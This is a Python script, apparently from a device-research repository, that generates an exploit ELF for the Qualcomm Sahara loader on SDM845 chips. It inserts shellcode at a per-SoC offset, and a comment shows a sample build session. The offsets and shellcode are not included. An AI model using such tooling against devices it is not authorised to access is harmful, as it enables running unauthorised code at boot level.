import argparse
import os
import glob
from offsets import OFFSETS
from pathlib import Path
ELF_SIZE = 0x2000


#   daniel@dev:~/sdm845-payloads/coyote$ make
#   clang --target=aarch64-linux-gnu -c coyote.S -o coyote.elf
#   llvm-objcopy -O binary coyote.elf coyote.bin
#   rm coyote.elf
#   daniel@dev:~/sdm845-payloads/coyote$ cd ..
#   daniel@dev:~/sdm845-payloads$ python3 main.py -s sdm845 -p coyote
#   Selected SoC: sdm845
#   Injected elf hdr and phdrs
#   Shellcode starts at 0xDD8
#   ELF size: 0x2000
#   Generated ELF
#   daniel@dev:~/sdm845-payloads$ ls
#   __pycache__  coyote  main.py  offsets.py  sdm845-exploit-coyote.elf

def main():
    parser = argparse.ArgumentParser(description="Shellcode Sahara ELF generator")
    parser.add_argument('-s', '--soc', type=str, help="Selected SoC", required=True)
    parser.add_argument('-p', '--payload', type=str, help="Selected payload", required=True)
    args = parser.parse_args()
    soc = args.soc
    payload = args.payload

    for path in glob.glob("*-exploit-*.elf"):
        os.remove(path)

    print(f"Selected SoC: {soc}")
    elf_result = bytearray(ELF_SIZE)
    hdr = OFFSETS[args.soc]["elf_hdr_top"]
    if len(hdr) > ELF_SIZE:
        raise ValueError("elf header larger than elf size")

    elf_result[:len(hdr)] = hdr
    print("Injected elf hdr and phdrs")
    
    payload_path = f"{payload}/{payload}.bin"

    if not os.path.exists(payload_path):
        print(f"Payload {payload} not found or not built!!")
        exit()

    with open(payload_path, "rb") as f:
        shellcode = f.read()

    shellcode_start = OFFSETS[soc]["shellcode_start"]
    
    elf_result[shellcode_start:shellcode_start + len(shellcode)] = shellcode
    
    print(f"Shellcode starts at 0x{shellcode_start:X}")

    Path(f'{soc}-exploit-{payload}.elf').write_bytes(elf_result)
    print(f"ELF size: 0x{ELF_SIZE:x}")
    print(f"Generated ELF")


if __name__ == "__main__":
    main()
